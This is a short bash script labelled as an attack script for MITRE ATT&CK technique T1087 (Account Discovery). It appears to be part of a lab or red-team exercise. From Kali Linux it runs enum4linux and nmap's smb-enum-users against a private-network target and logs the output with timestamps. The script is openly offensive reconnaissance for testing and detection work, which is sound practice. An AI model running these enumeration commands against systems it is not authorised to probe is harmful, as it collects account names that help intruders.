#!/bin/bash
# T1087 - Account Discovery Attack Script
# Author: Greg Lewis
# Date: 2025-12-20
# Platform: Kali Linux

TARGET="192.168.8.18"
LOGDIR=~/attack-logs/T1087

echo "========================================="
echo "T1087 - Account Discovery"
echo "Target: $TARGET"
echo "Started: $(date)"
echo "========================================="

# Create log directory
mkdir -p "$LOGDIR"
cd "$LOGDIR"

# Method 1: enum4linux
echo -e "\n[*] Running enum4linux..."
enum4linux -U "$TARGET" | tee enum4linux-output.txt
echo "enum4linux completed: $(date)" | tee -a timeline.txt

# Method 2: nmap SMB user enumeration
echo -e "\n[*] Running nmap SMB enumeration..."
sudo nmap -p 445 --script smb-enum-users "$TARGET" | tee nmap-smb-output.txt
echo "nmap completed: $(date)" | tee -a timeline.txt

echo -e "\n========================================="
echo "Attack completed: $(date)"
echo "Logs saved to: $LOGDIR"
echo "========================================="